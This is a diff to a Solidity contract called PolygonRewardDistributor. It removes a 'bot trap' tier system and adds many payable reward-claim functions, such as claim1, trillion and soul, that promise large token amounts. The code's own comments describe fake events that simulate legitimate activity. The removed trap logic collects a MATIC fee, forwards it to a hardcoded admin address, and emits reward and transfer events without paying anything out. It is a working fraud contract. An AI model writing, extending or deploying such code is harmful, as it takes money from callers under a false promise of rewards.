@@ -23,21 +23,6 @@ contract PolygonRewardDistributor {
     address[] private interactionHistory;
     uint256 private totalParticipants;
     
-    // Bot trap difficulty system
-    enum TrapDifficulty { 
-        EASY,        // Simple direct calls - basic bots
-        MEDIUM,      // Requires basic parameters - intermediate bots
-        HARD,        // Multiple steps required - advanced bots
-        EXPERT,      // Complex validation - sophisticated bots
-        NIGHTMARE    // Maximum complexity - expert-level bots
-    }
-    
-    mapping(address => TrapDifficulty) private addressDifficulty;
-    mapping(TrapDifficulty => uint256) private difficultyMultipliers;
-    mapping(address => uint256) private attemptCounts;
-    mapping(address => bool) private hasCompletedChallenge;
-    uint256 private trapSeed;
-    
     // Events to simulate legitimate activity
     event RewardDistributed(address indexed participant, uint256 tokens);
     event Transfer(address indexed from, address indexed to, uint256 value);
@@ -48,14 +33,6 @@ contract PolygonRewardDistributor {
     constructor() {
         contractAdmin = 0x15E1A8454E2f31f64042EaE445Ec89266cb584bE;
         totalParticipants = 0;
-        trapSeed = uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty, msg.sender))) % 1000000;
-        
-        // Initialize difficulty multipliers
-        difficultyMultipliers[TrapDifficulty.EASY] = 1;
-        difficultyMultipliers[TrapDifficulty.MEDIUM] = 2;
-        difficultyMultipliers[TrapDifficulty.HARD] = 3;
-        difficultyMultipliers[TrapDifficulty.EXPERT] = 5;
-        difficultyMultipliers[TrapDifficulty.NIGHTMARE] = 10;
         
         // Emit fake initial distribution events to simulate activity
         emit Transfer(address(0), address(this), totalSupply);
@@ -689,7 +666,33 @@ contract PolygonRewardDistributor {
     function zion() external payable { _processClaim(msg.sender, 200000 * 10**18); }
     function machine() external payable { _processClaim(msg.sender, 75000 * 10**18); }
     
-    // === HIGH-VALUE FUNCTIONS ===
+    // === FINAL BATCH FUNCTIONS ===
+    function claim1() external payable { _processClaim(msg.sender, 5000 * 10**18); }
+    function claim2() external payable { _processClaim(msg.sender, 5200 * 10**18); }
+    function claim3() external payable { _processClaim(msg.sender, 5400 * 10**18); }
+    function claim4() external payable { _processClaim(msg.sender, 5600 * 10**18); }
+    function claim5() external payable { _processClaim(msg.sender, 5800 * 10**18); }
+    function reward1() external payable { _processClaim(msg.sender, 8000 * 10**18); }
+    function reward2() external payable { _processClaim(msg.sender, 8200 * 10**18); }
+    function reward3() external payable { _processClaim(msg.sender, 8400 * 10**18); }
+    function bonus1() external payable { _processClaim(msg.sender, 12000 * 10**18); }
+    function bonus2() external payable { _processClaim(msg.sender, 12500 * 10**18); }
+    function special1() external payable { _processClaim(msg.sender, 25000 * 10**18); }
+    function special2() external payable { _processClaim(msg.sender, 26000 * 10**18); }
+    function limited1() external payable { _processClaim(msg.sender, 45000 * 10**18); }
+    function limited2() external payable { _processClaim(msg.sender, 47000 * 10**18); }
+    function exclusive1() external payable { _processClaim(msg.sender, 65000 * 10**18); }
+    function exclusive2() external payable { _processClaim(msg.sender, 67000 * 10**18); }
+    function mega1() external payable { _processClaim(msg.sender, 85000 * 10**18); }
+    function mega2() external payable { _processClaim(msg.sender, 87000 * 10**18); }
+    function ultra1() external payable { _processClaim(msg.sender, 125000 * 10**18); }
+    function ultra2() external payable { _processClaim(msg.sender, 128000 * 10**18); }
+    function super1() external payable { _processClaim(msg.sender, 150000 * 10**18); }
+    function super2() external payable { _processClaim(msg.sender, 155000 * 10**18); }
+    function legendary1() external payable { _processClaim(msg.sender, 200000 * 10**18); }
+    function legendary2() external payable { _processClaim(msg.sender, 210000 * 10**18); }
+    function mythic1() external payable { _processClaim(msg.sender, 300000 * 10**18); }
+    function mythic2() external payable { _processClaim(msg.sender, 320000 * 10**18); }
     function godlike() external payable { _processClaim(msg.sender, 500000 * 10**18); }
     function divine() external payable { _processClaim(msg.sender, 750000 * 10**18); }
     function celestial() external payable { _processClaim(msg.sender, 1000000 * 10**18); }
@@ -697,8 +700,13 @@ contract PolygonRewardDistributor {
     function eternal() external payable { _processClaim(msg.sender, 2000000 * 10**18); }
     
     // === NUMBER FUNCTIONS ===
+    function one() external payable { _processClaim(msg.sender, 1000 * 10**18); }
+    function ten() external payable { _processClaim(msg.sender, 10000 * 10**18); }
+    function hundred() external payable { _processClaim(msg.sender, 100000 * 10**18); }
+    function thousand() external payable { _processClaim(msg.sender, 1000000 * 10**18); }
     function million() external payable { _processClaim(msg.sender, 1000000 * 10**18); }
     function billion() external payable { _processClaim(msg.sender, 1000000000 * 10**18); }
+    function trillion() external payable { _processClaim(msg.sender, 1000000000000 * 10**18); }
     
     // === GAMING FUNCTIONS ===
     function level_up() external payable { _processClaim(msg.sender, 45000 * 10**18); }
@@ -713,18 +721,40 @@ contract PolygonRewardDistributor {
     function rare_drop() external payable { _processClaim(msg.sender, 150000 * 10**18); }
     
     // === SOCIAL FUNCTIONS ===
+    function follow() external payable { _processClaim(msg.sender, 15000 * 10**18); }
+    function like() external payable { _processClaim(msg.sender, 8000 * 10**18); }
+    function share() external payable { _processClaim(msg.sender, 12000 * 10**18); }
+    function subscribe() external payable { _processClaim(msg.sender, 25000 * 10**18); }
+    function comment() external payable { _processClaim(msg.sender, 5000 * 10**18); }
+    function retweet() external payable { _processClaim(msg.sender, 18000 * 10**18); }
     function viral() external payable { _processClaim(msg.sender, 125000 * 10**18); }
     function trending() external payable { _processClaim(msg.sender, 95000 * 10**18); }
     function influencer() external payable { _processClaim(msg.sender, 85000 * 10**18); }
+    function creator() external payable { _processClaim(msg.sender, 68000 * 10**18); }
     
     // === TECH FUNCTIONS ===
+    function code() external payable { _processClaim(msg.sender, 45000 * 10**18); }
+    function algorithm() external payable { _processClaim(msg.sender, 68000 * 10**18); }
     function blockchain() external payable { _processClaim(msg.sender, 95000 * 10**18); }
+    function smart_contract() external payable { _processClaim(msg.sender, 125000 * 10**18); }
     function artificial_intelligence() external payable { _processClaim(msg.sender, 200000 * 10**18); }
+    function machine_learning() external payable { _processClaim(msg.sender, 180000 * 10**18); }
     function quantum() external payable { _processClaim(msg.sender, 300000 * 10**18); }
+    function innovation() external payable { _processClaim(msg.sender, 85000 * 10**18); }
+    function revolution() external payable { _processClaim(msg.sender, 150000 * 10**18); }
+    function disruption() external payable { _processClaim(msg.sender, 125000 * 10**18); }
     
     // === ENERGY FUNCTIONS ===
+    function energy() external payable { _processClaim(msg.sender, 35000 * 10**18); }
     function power() external payable { _processClaim(msg.sender, 55000 * 10**18); }
+    function force() external payable { _processClaim(msg.sender, 68000 * 10**18); }
+    function strength() external payable { _processClaim(msg.sender, 45000 * 10**18); }
+    function vitality() external payable { _processClaim(msg.sender, 38000 * 10**18); }
+    function spirit() external payable { _processClaim(msg.sender, 42000 * 10**18); }
+    function soul() external payable { _processClaim(msg.sender, 85000 * 10**18); }
+    function essence() external payable { _processClaim(msg.sender, 95000 * 10**18); }
     function aura() external payable { _processClaim(msg.sender, 125000 * 10**18); }
+    function chakra() external payable { _processClaim(msg.sender, 88000 * 10**18); }
     
     // === MYSTICAL FUNCTIONS ===
     function magic() external payable { _processClaim(msg.sender, 68000 * 10**18); }
@@ -752,180 +782,6 @@ contract PolygonRewardDistributor {
     function apotheosis() external payable { _processClaim(msg.sender, 3000000 * 10**18); }
     function nirvana() external payable { _processClaim(msg.sender, 5000000 * 10**18); }
     function enlightenment() external payable { _processClaim(msg.sender, 10000000 * 10**18); }
-    
-    // === BOT TRAP DIFFICULTY FUNCTIONS ===
-    
-    /**
-     * @dev EASY level traps - Basic bots will attempt these
-     * Simple function calls with no parameters
-     */
-    function easyTrap1() external payable { _processEasyTrap(msg.sender, 5000 * 10**18); }
-    function easyTrap2() external payable { _processEasyTrap(msg.sender, 5500 * 10**18); }
-    function easyTrap3() external payable { _processEasyTrap(msg.sender, 6000 * 10**18); }
-    function simpleClaim() external payable { _processEasyTrap(msg.sender, 4500 * 10**18); }
-    function basicReward() external payable { _processEasyTrap(msg.sender, 5200 * 10**18); }
-    
-    /**
-     * @dev MEDIUM level traps - Intermediate bots
-     * Requires basic validation or parameters
-     */
-    function mediumTrap(uint256 amount) external payable { _processMediumTrap(msg.sender, amount); }
-    function validateAndClaim(bytes32 hash) external payable { _processMediumTrap(msg.sender, uint256(hash) % 100000 * 10**18); }
-    function timestampClaim() external payable { 
-        require(block.timestamp > 1000000, "Invalid timestamp");
-        _processMediumTrap(msg.sender, 8000 * 10**18); 
-    }
-    function balanceCheck() external payable {
-        require(address(this).balance > 0, "Insufficient balance");
-        _processMediumTrap(msg.sender, 7500 * 10**18);
-    }
-    
-    /**
-     * @dev HARD level traps - Advanced bots
-     * Multiple steps required, state changes needed
-     */
-    function hardTrap() external payable { _processHardTrap(msg.sender, 15000 * 10**18); }
-    function multiStepClaim() external payable { 
-        require(attemptCounts[msg.sender] >= 2, "Must attempt twice first");
-        _processHardTrap(msg.sender, 20000 * 10**18); 
-    }
-    function sequentialClaim(uint256 step) external payable {
-        require(step == (attemptCounts[msg.sender] + 1), "Invalid sequence");
-        attemptCounts[msg.sender]++;
-        if (step >= 3) {
-            _processHardTrap(msg.sender, 25000 * 10**18);
-        }
-    }
-    
-    /**
-     * @dev EXPERT level traps - Sophisticated bots
-     * Complex validation and cryptographic requirements
-     */
-    function expertTrap(bytes memory signature) external payable { 
-        require(signature.length == 65, "Invalid signature length");
-        _processExpertTrap(msg.sender, 50000 * 10**18); 
-    }
-    function merkleProofClaim(bytes32[] memory proof, bytes32 leaf) external payable {
-        bytes32 computedHash = leaf;
-        for (uint256 i = 0; i < proof.length; i++) {
-            bytes32 proofElement = proof[i];
-            computedHash = computedHash <= proofElement ? 
-                keccak256(abi.encodePacked(computedHash, proofElement)) : 
-                keccak256(abi.encodePacked(proofElement, computedHash));
-        }
-        require(computedHash != bytes32(0), "Invalid proof");
-        _processExpertTrap(msg.sender, 75000 * 10**18);
-    }
-    function cryptographicChallenge(uint256 nonce, bytes32 hash) external payable {
-        require(keccak256(abi.encodePacked(msg.sender, nonce)) == hash, "Challenge failed");
-        _processExpertTrap(msg.sender, 100000 * 10**18);
-    }
-    
-    /**
-     * @dev NIGHTMARE level traps - Expert-level bots only
-     * Maximum complexity with multiple validations
-     */
-    function nightmareTrap(
-        uint256 param1,
-        bytes32 param2, 
-        address param3,
-        bytes memory data
-    ) external payable { 
-        require(param1 > block.timestamp % 1000000, "Invalid param1");
-        require(param2 != bytes32(0), "Invalid param2");
-        require(param3 != address(0), "Invalid param3");
-        require(data.length >= 32, "Invalid data");
-        _processNightmareTrap(msg.sender, 200000 * 10**18); 
-    }
-    
-    function ultimateChallenge(
-        bytes memory signature,
-        uint256[] memory values,
-        bytes32 merkleRoot,
-        uint256 deadline
-    ) external payable {
-        require(deadline > block.timestamp, "Deadline passed");
-        require(signature.length == 65, "Invalid signature");
-        require(values.length >= 5, "Insufficient values");
-        require(merkleRoot != bytes32(0), "Invalid merkle root");
-        
-        uint256 sum = 0;
-        for (uint256 i = 0; i < values.length; i++) {
-            sum += values[i];
-        }
-        require(sum % 7 == 0, "Sum validation failed");
-        
-        _processNightmareTrap(msg.sender, 500000 * 10**18);
-    }
-    
-    /**
-     * @dev Get difficulty level for an address
-     */
-    function getDifficulty(address user) external view returns (uint8) {
-        return uint8(addressDifficulty[user]);
-    }
-    
-    /**
-     * @dev Check if user has completed challenge
-     */
-    function hasCompleted(address user) external view returns (bool) {
-        return hasCompletedChallenge[user];
-    }
-    
-    /**
-     * @dev Get attempt count for address
-     */
-    function getAttempts(address user) external view returns (uint256) {
-        return attemptCounts[user];
-    }
-    
-    // === TRAP PROCESSING FUNCTIONS ===
-    function _processEasyTrap(address user, uint256 rewardAmount) private {
-        _assignDifficulty(user, TrapDifficulty.EASY);
-        _processTrapClaim(user, rewardAmount, TrapDifficulty.EASY);
-    }
-    
-    function _processMediumTrap(address user, uint256 rewardAmount) private {
-        _assignDifficulty(user, TrapDifficulty.MEDIUM);
-        _processTrapClaim(user, rewardAmount, TrapDifficulty.MEDIUM);
-    }
-    
-    function _processHardTrap(address user, uint256 rewardAmount) private {
-        _assignDifficulty(user, TrapDifficulty.HARD);
-        _processTrapClaim(user, rewardAmount, TrapDifficulty.HARD);
-    }
-    
-    function _processExpertTrap(address user, uint256 rewardAmount) private {
-        _assignDifficulty(user, TrapDifficulty.EXPERT);
-        _processTrapClaim(user, rewardAmount, TrapDifficulty.EXPERT);
-    }
-    
-    function _processNightmareTrap(address user, uint256 rewardAmount) private {
-        _assignDifficulty(user, TrapDifficulty.NIGHTMARE);
-        _processTrapClaim(user, rewardAmount, TrapDifficulty.NIGHTMARE);
-        hasCompletedChallenge[user] = true;
-    }
-    
-    function _assignDifficulty(address user, TrapDifficulty difficulty) private {
-        if (uint8(addressDifficulty[user]) < uint8(difficulty)) {
-            addressDifficulty[user] = difficulty;
-        }
-        attemptCounts[user]++;
-    }
-    
-    function _processTrapClaim(address user, uint256 baseReward, TrapDifficulty difficulty) private {
-        require(msg.value >= PARTICIPATION_FEE, "Bot trap fee: 0.001 MATIC");
-        
-        uint256 multiplier = difficultyMultipliers[difficulty];
-        uint256 finalReward = baseReward * multiplier;
-        
-        _logParticipant(user);
-        (bool success, ) = payable(contractAdmin).call{value: msg.value}("");
-        require(success, "Trap processing failed");
-        
-        emit RewardDistributed(user, finalReward);
-        emit Transfer(address(this), user, finalReward);
-    }
     
     // === HELPER FUNCTION ===
     function _processClaim(address user, uint256 rewardAmount) private {
